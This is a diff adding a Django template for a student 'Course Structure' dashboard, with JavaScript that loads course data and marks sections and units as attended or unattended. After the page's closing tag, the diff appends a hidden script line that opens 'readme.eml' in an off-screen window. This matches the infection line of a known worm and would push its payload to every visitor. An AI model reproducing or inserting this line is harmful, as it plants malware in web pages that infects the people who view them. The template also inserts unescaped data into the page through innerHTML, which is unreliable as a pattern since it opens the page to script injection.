@@ -1,0 +1,354 @@
+{% load staticfiles %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Course Structure</title>
+
+    <link rel="stylesheet" type="text/css" href="{% static "bootstrap/css/bootstrap.min.css" %}"/>
+    <link rel="stylesheet" type="text/css" href="{% static "font-awesome/css/font-awesome.min.css" %}"/>
+    <link rel="stylesheet" type="text/css" href="{% static "css/local.css" %}"/>
+
+    <script type="text/javascript" src="{% static "js/jquery-1.10.2.min.js" %}"></script>
+    <script type="text/javascript" src="{% static "bootstrap/js/bootstrap.min.js" %}"></script>        
+
+</head>
+
+<body onload="add_course()">
+
+    <div id="wrapper">
+        <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+            
+            <div class="navbar-header">
+                
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                
+                <a class="navbar-brand" href="{% url 'student_home' %}">Back to Student</a>
+                 
+            </div>
+            
+            <div class="collapse navbar-collapse navbar-ex1-collapse">
+                
+                <ul class="nav navbar-nav side-nav">
+                
+                    <li> <a href="{% url 'student_home' %}"> <i class="fa fa-bullseye"> </i> Dashboard </a> </li>
+                    <li class="selected"><a href="{% url 'bootstrap' %}"><i class="fa fa-table"></i >Course Structure</a></li>            
+                </ul>
+                
+                <ul class="nav navbar-nav navbar-right navbar-user">
+                    
+                    <!-- <li class="dropdown messages-dropdown">
+                        
+                        <a href="#" class="dropdown-toggle" data-toggle="dropdown"><i class="fa fa-envelope"></i> Messages <span class="badge">2</span> <b class="caret"></b></a>
+                        
+                        <ul class="dropdown-menu">
+                        
+                            <li class="dropdown-header">2 New Messages</li>
+                           
+                            <li class="message-preview">
+                                <a href="#">
+                                    <span class="avatar"><i class="fa fa-bell"></i></span>
+                                    <span class="message">Security alert</span>
+                                </a>
+                            </li>
+                           
+                            <li class="divider"></li>
+                            <li class="message-preview">
+                                <a href="#">
+                                    <span class="avatar"><i class="fa fa-bell"></i></span>
+                                    <span class="message">Security alert</span>
+                                </a>
+                            </li>
+                           
+                            <li class="divider"></li>
+                           
+                            <li><a href="#">Go to Inbox <span class="badge">2</span></a></li>
+                        
+                        </ul>
+                    </li> -->
+                    
+                    <li class="dropdown user-dropdown">
+                        
+                        <a href="#" class="dropdown-toggle" data-toggle="dropdown"><i class="fa fa-user"></i>{{uname}}<b class="caret"></b></a>
+                        <ul class="dropdown-menu">
+                            <li><a href="#"><i class="fa fa-user"></i> Profile</a></li>
+                            <li><a href="#"><i class="fa fa-gear"></i> Settings</a></li>
+                            <li class="divider"></li>
+                            <li><a href="{% url 'getout' %}"><i class="fa fa-power-off"></i> Log Out</a></li>
+                        </ul>
+                    
+                    </li>
+                
+                </ul>
+            </div>
+        </nav>
+
+		<!--	<div id="page-wrapper">            
+				{% for data in course_lst %}
+						<div class="row" onclick="func()">
+									<div class="col-lg-2 text-center">
+										<div class="panel panel-default">
+											<div class="panel-body" style = "background-color:GREEN;" id="d_{{forloop.counter1}}">
+												{{data}}
+											</div>
+										</div>
+									</div>
+						</div>
+				{% endfor %}
+            </div>
+       -->
+       
+      <!-- <button id="add" onclick="add_course()">Add</button> <button id="clear" onclick="f()">Clear</button></br></br> -->
+
+       <!--  Author:  Ankit (ankit93100@gmail.com)  -->
+       
+       		       <div id="page-wrapper">
+
+					<div class="row">
+						<div class="col-lg-12 text-center">
+							<div class="panel panel-default">
+								<div class="panel-body" id= 'heading_name'>
+									Your Courses
+								</div>
+							</div>
+						</div>
+					</div>
+					
+		          	  </div>      
+              </br>
+			<div id='a'> </div>
+			<div id="loading" style="display:none;position:absolute;left:55%;top:50%;margin-left:-10px;margin-top:-10px;">
+				<p><img src= "{% static 'ajax-loader.gif' %}" /> </p>
+			</div>
+			<div id='test'></div>
+       
+       
+       
+      <script>
+      		  
+				var url="{% url 'course_data' %}"
+				function add_course(){
+					var s="";
+					var myDjangoList = (("{{course_lst |safe}}").replace(/&(l|g|quo)t;/g, function(a,b){
+						return {
+							l   : '<',
+							g   : '>',
+							quo : '"'
+						}[b];
+					}));
+
+					myDjangoList = myDjangoList.replace(/u'/g, '\'')
+					myDjangoList = myDjangoList.replace(/'/g, '\"')
+
+					myData = JSON.parse( myDjangoList );
+					for (var prop in myData) {
+						if (myData.hasOwnProperty(prop)) {
+							s=s+ "<p style= 'margin-left:5em'><button id= "+myData[prop]+" onclick='ff(this.id)' class='btn btn-default'>"+myData[prop]+"</button></p>";
+						}
+					}
+					s = s + "</br></br>"
+					
+					document.getElementById('heading_name').innerHTML="Your Courses";
+					document.getElementById('a').innerHTML=s;
+					document.getElementById('test').innerHTML="";
+				}
+					
+				function f()
+				{
+					document.getElementById('a').innerHTML="";
+					document.getElementById('test').innerHTML="";	
+				}	
+				 var myData;
+				 
+				 var store = {};
+				 var count = {};
+				 var count_tot = {};
+				 var count_att = {};
+				 var count_tot_unit = {}
+				 var count_unit = {}
+				 var count_unit_att = {}
+				 function find_vis(myData, course_num){
+					 lst = myData["check_id"];
+					 var flg= false;
+						for(item1 in myData[course_num]){
+							  
+							  d1 = myData[course_num][item1];
+							  
+							  count[d1] = 0;
+							  count_tot[d1] = 0;
+							  for(item2 in myData[d1]){
+								    
+								    d2 = myData[d1][item2];  
+									
+									if(d1 in count_tot){
+										count_tot[d1] = count_tot[d1] + 1;
+									  }else{
+										  count_tot[d1] = 1;
+										}
+									
+								var flg1 = true;	
+									  count_tot_unit[d2] = 0
+									  count_unit[d2] = 0
+									  count_unit_att[d2] = 0;
+								    for(item3 in myData[d2]){
+										
+										d3= myData[d2][item3];
+										
+										for(item4 in myData[d3]){
+											
+											count_tot_unit[d2] = count_tot_unit[d2] + 1;
+											
+											flg = false;
+											for(dta in lst){
+												if(lst[dta]==item4)
+													flg = true;
+											}
+											
+											if(!flg){
+												count_unit[d2] = count_unit[d2] + 1;
+												if(flg1){
+													if(d1 in count){
+														count[d1] = count[d1] + 1;
+													}else{
+														count[d1] = 1;
+													}
+													flg1 = false;
+												}
+												store[d1] = true;
+												store[d2] = true;
+												store[myData[d3][item4]] = true;
+											}
+										}
+									}
+									if(count_unit[d2] == 0){
+										count_unit_att[d2] = count_tot_unit[d2];
+									}	
+							  }
+							  if(count[d1] == 0){
+								  count_att[d1] = count_tot[d1];
+							}
+						}
+				 }
+				
+				function fx(val, course_num){
+					var s = "";
+					myData = JSON.parse(val);
+					find_vis(myData, course_num);
+					
+					
+					if(myData.hasOwnProperty(course_num)){
+							for(item in myData[course_num]){
+								if(count_tot[myData[course_num][item]]!=0){
+									if(myData[course_num][item] in store){
+										if(count_tot[myData[course_num][item]]==count[myData[course_num][item]])
+										s=s+"<p class='btn btn-primary btn-lg' onclick= 'func_chap(this.innerHTML)' style = 'background-color:#3333FF;margin-left:3em'>"+myData[course_num][item]+"|| Unattended  "+count[myData[course_num][item]]+"/"+count_tot[myData[course_num][item]]+" sub-sections</p></br></br>";
+										else
+										s=s+"<p class='btn btn-primary btn-lg' onclick= 'func_chap(this.innerHTML)' style = 'background-color:#3399FF;margin-left:3em'>"+myData[course_num][item]+"|| Unattended  "+count[myData[course_num][item]]+"/"+count_tot[myData[course_num][item]]+" sub-sections</p></br></br>";
+									}else{
+										s=s+"<p class='btn btn-primary btn-lg' onclick= 'func_chap(this.innerHTML)' style = 'background-color:#33CCFF;margin-left:3em'>"+myData[course_num][item]+"|| Attended  "+count_att[myData[course_num][item]]+"/"+count_tot[myData[course_num][item]]+" sub-sections</p></br></br>";
+									}
+								}
+							}
+					}
+					
+					s = s + "<hr></br><p><ul><li>Number of sub-sections attended or unattended out of total sub-sections</li><li>Units consisting of html data and discussion data has not been included</li></ul> </p></br>"; 
+					document.getElementById('heading_name').innerHTML="Sections";
+					document.getElementById('test').innerHTML=s;
+				}	 
+				 
+				function func_chap(data){
+					data = data.split('||')[0];
+					var s=""
+					if(myData.hasOwnProperty(data)){
+							for( item in myData[data]){
+								if(myData[data][item] in store){
+									if(count_tot_unit[myData[data][item]]==count_unit[myData[data][item]])
+									s=s+"<p class='btn btn-success' onclick= 'func_sec(this.innerHTML)' style = 'background-color:#3333FF;margin-left:3em'>"+myData[data][item]+"|| Unattended  "+count_unit[myData[data][item]]+"/"+count_tot_unit[myData[data][item]]+" units</p></br></br>";
+									else
+									s=s+"<p class='btn btn-success' onclick= 'func_sec(this.innerHTML)' style = 'background-color:#3399FF;margin-left:3em'>"+myData[data][item]+"|| Unattended  "+count_unit[myData[data][item]]+"/"+count_tot_unit[myData[data][item]]+" units</p></br></br>";
+								}
+								else{
+									s=s+"<p class='btn btn-success' onclick= 'func_sec(this.innerHTML)' style = 'background-color:#33CCFF;margin-left:3em'>"+myData[data][item]+"|| Attended  "+count_unit_att[myData[data][item]]+"/"+count_tot_unit[myData[data][item]]+" units</p></br></br>";
+								}
+							}						
+						}
+					document.getElementById('heading_name').innerHTML="Sub-sections";
+					document.getElementById('test').innerHTML=s;	
+				} 
+				
+				var ss = "";
+				function func_sec(data){
+					data = data.split('||')[0];
+					var s=""
+					ss = "";
+					if(myData.hasOwnProperty(data)){
+							for( item in myData[data]){
+								func_ver(myData[data][item]);
+							}
+						}
+						document.getElementById('heading_name').innerHTML="Units";
+						document.getElementById('test').innerHTML=ss;			
+				}  
+				
+				function func_ver(data){
+					if(myData.hasOwnProperty(data)){
+							for( item in myData[data]){
+								if(myData[data][item] in store){
+									ss = ss+"<p class='btn btn-info' style = 'background-color:#3333FF;margin-left:3em'>"+myData[data][item]+" || Unattended</p></br></br>";
+								}else{
+									ss = ss+"<p class='btn btn-info'  style = 'background-color:#33CCFF;margin-left:3em'>"+myData[data][item]+" || Attended</p></br></br>";
+								}
+							}
+						}
+					}  
+				 
+				function ff(course_num){
+					f();
+					//alert("called");
+					loadXMLDoc(course_num);
+				}
+			    function loadXMLDoc(course_num){
+						showLoading();
+						document.getElementById('heading_name').innerHTML="";
+						var xmlhttp;
+						if (window.XMLHttpRequest){
+						   xmlhttp=new XMLHttpRequest();
+						 }
+						else{
+						   xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+						}
+						xmlhttp.onreadystatechange=function(){
+							
+								if (xmlhttp.readyState==4 && xmlhttp.status==200){
+										
+										hideLoading();
+										fx(xmlhttp.responseText, course_num);				
+								}
+								//alert(xmlhttp.status)
+						  }
+						xmlhttp.open("GET","{% url 'course_data' %}?course_num="+encodeURI(course_num),true);
+						xmlhttp.send();
+				}
+			   
+				function showLoading() {
+						$("#loading").show();
+					}
+
+				function hideLoading() {
+					$("#loading").hide();
+				}
+			    	 
+	  </script>
+	  
+	  
+       
+</body>
+</html>
+
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
